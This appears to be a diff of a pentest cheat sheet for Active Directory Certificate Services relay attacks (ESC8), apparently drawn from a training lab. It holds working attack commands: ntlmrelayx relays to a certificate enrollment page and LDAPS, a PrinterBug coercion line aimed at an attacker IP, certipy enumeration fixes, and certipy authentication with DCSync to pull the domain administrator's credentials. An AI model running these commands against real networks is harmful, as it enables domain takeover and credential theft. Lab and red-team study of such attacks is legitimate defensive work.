@@ -15,8 +15,8 @@ impacket-ntlmrelayx -t http://10.129.234.110/certsrv/certfnsh.asp --adcs -smb2su
 pip install certipy-ad
 
 # Prerequisites Check
-certipy adcs -u 'DOMAIN\user' -p 'Pass123!' -dc-ip DC_IP domain.local
-certipy adcs -u 'user' -p 'pass' -dc-ip DC_IP -username target_admin
+certipy find -u 'DOMAIN\user' -p 'Pass123!' -dc-ip DC_IP -target domain.local
+certipy find -u 'user' -p 'pass' -dc-ip DC_IP -username target_admin
 
 # 1. PrinterBug
 python3 printerbug.py INLANEFREIGHT.LOCAL/<USER>:"<PLAINTEXT_PASSWORD>"@<TARGET_IP> <ATTACKER_IP>
@@ -75,9 +75,7 @@ impacket-ntlmrelayx -t ldaps://DC.domain.local --adcs-device-interface \
 certipy auth -pfx ./certs/abused_cert.pfx -username machine$ -domain domain.local \
   -dc-ip DC_IP -dcsync domain.local/administrator
 
-
-====== CERTIPY =================================================================================================================================================================
-
+OneLine:
 #!/bin/bash
 # =====================================================
 # Certipy ESC8 - Variable Aware (Pro)
